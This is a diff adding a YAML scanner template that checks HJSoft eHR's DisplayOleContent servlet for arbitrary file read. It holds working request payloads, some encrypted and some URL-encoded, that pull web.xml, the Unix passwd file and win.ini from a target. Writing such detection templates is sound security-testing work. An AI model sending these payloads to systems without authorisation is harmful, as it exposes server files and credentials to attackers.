@@ -1,0 +1,76 @@
+id: hjsoft-hcm-DisplayOleContent-file-read
+
+info:
+  name: 宏景eHR DisplayOleContent任意文件读取漏洞
+  author: onewin
+  severity: high
+  description: |
+    宏景eHR系统存在DisplayOleContent接口任意文件读取漏洞，攻击者可利用此漏洞读取服务器上的敏感文件
+    [漏洞发现时间：2025年7月]
+  reference:
+    - https://www.hjsoft.com.cn
+  tags: HJSoft-HCM
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/DisplayOleContent?filePath=E~34djIXwDQj~39QpNQPAATTP~32HJFPAATTP~32ElEAPAATTP~32HJFPAATTPmROFMKr~31aR~32wOiMLQUvdsPAATTP~33HJDPAATTP&bencrypt=true"
+    headers:
+      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.972.9 Safari/537.36"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "servlet-name"
+          - "<?xml"
+        part: body
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/w_selfservice/servlet/DisplayOleContent?filePath=E~34djIXwDQj~39QpNQPAATTP~32HJFPAATTP~32ElEAPAATTP~32HJFPAATTPmROFMKr~31aR~32wOiMLQUvdsPAATTP~33HJDPAATTP&bencrypt=true"
+    headers:
+      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.1814.10 Safari/537.36"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "servlet-name"
+          - "<?xml"
+        part: body
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/w_selfservice/servlet/DisplayOleContent?filePath=%60%65%74%63%60%70%61%73%73%77%64&bencrypt=0"
+    headers:
+      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.2143.126 Safari/537.36"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/w_selfservice/servlet/DisplayOleContent?filePath=%63%3a%60%77%69%6e%64%6f%77%73%60%77%69%6e%2e%69%6e%69&bencrypt=0"
+    headers:
+      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.2143.126 Safari/537.36"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
